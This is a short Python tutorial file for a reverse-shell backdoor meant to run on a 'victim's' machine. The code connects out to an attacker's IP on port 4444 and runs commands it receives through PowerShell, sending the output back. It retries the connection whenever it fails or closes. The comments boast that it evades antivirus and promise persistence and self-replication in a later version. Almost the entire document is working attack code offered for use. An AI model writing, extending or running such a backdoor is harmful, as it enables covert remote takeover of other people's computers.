##In this tutorial I will show you how to make a simple backdoor-like tool in python which you can modify and execute on victim’s machine.
## It has pros and cons; Pros like being completely undetected by any antivirus cons being that victim needs to have Python installed. I have tried my best not to use external modules, also I have made a better version of this program. For this i will make a special video as soon as I consider it ready. Until then feel free to build on top of this. Try it out yourself.
## Next version has (already) : -option to add a task into task scheduler of victim’s PC so your backdoor will run every day at 9 am for example. -Option to add onto startup. -Option to self replicate. And so on.
##
##CODE:

from sys import argv
import os
#import random
import subprocess
import socket
#our goal is to import modules that every pc with python has - Default modules.

def shell():
    #Minimal backdoor/payload in python
    print("Attempting connection to the Hacker...\nWaiting...")

    
    try:
        lhost = "ATTACKERS IP"#attacker's ip
        lport = 4444#port that attacker listens to
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((lhost,lport))
        print("Hooking onto :",lhost,lport)
        while True:
            try:
                header = f"\n\n[+] Shell On.\n\n>"
                sock.send(header.encode())
                cmd = sock.recv(1024).decode("utf-8")
                #Newline was causing issues
                cmd = cmd.replace("\n","")
                try:
                    proc = subprocess.Popen(["powershell.exe",cmd], stdout=subprocess.PIPE, shell=True)
                    (out,err) = proc.communicate()
                    sock.send(str(out).encode())

                #but here is the problem with this, a lot of commands dont work
                    #not even cd .. or cd
                    #so lets fix this in the next version
                    
                except Exception as eee:
                    #if the powershell command fails
                    shell()
                    


            except Exception as e:
                msg = "Error: {}".format(e)
                msg = bytes(msg, encoding="utf-8")
                sock.send(msg)


            
    except ConnectionRefusedError as reror:
        print("Connection refused, attempting again...")
        shell()
    except TimeoutError as timeout:
        print("Timing out... Retrying...")
        shell()
    except ConnectionResetError as hackerdidit:
        print("Hacker closed the connection....",hackerdidit)
        shell()
        #call the shell again, even when hacker closes the connection
        #there will still be attempts to listen for it.

shell()
